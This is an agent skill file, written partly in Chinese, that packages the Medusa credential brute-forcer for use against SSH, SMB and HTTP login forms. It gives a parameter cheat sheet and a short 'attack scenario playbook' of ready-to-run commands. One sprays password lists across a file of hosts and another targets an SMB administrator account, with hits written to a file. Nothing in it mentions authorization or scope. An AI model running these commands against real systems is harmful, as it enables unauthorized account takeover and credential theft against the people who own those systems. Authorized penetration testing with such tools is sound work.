---
name: medusa-bruteforce
description: "Medusa: Multi-service credential brute forcing. Signals: brute force, password spraying, SSH brute force, SMB, HTTP forms."
zh-signals: "Medusa: 多服务凭据爆破。信号:暴力破解,口令喷射,SSH 爆破,SMB,HTTP 表单。"
---

# Medusa

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/jmk-foofus/medusa
- 上游 License:LGPL-2.1(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
apt install medusa 或编译
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `-M ssh -h 10.0.0.5 -U users.txt -P pass.txt` | SSH 爆破 |
| `-M smbnt` | SMB |
| `-M http -m DIR:/admin -m FORM:u=user&p=pass` | HTTP 表单 |
| `-t 16` | 线程 |
| `-T 64` | 并行主机 |
| `-O out.txt` | 输出 |
| `-f` | 首命中即停 |
| `-n 2222` | 非标准端口 |

## 攻击场景 Playbook

### 多服务凭据爆破

```bash
medusa -M ssh -H ips.txt -U users.txt -P seasons.txt -t 32 -O hits.txt
medusa -M smbnt -h 10.0.0.5 -u administrator -P pass.txt -f
```

## 注意事项

模块化并行爆破器;支持 20+ 协议,大网段场景比 Hydra 的并行主机模式好用。
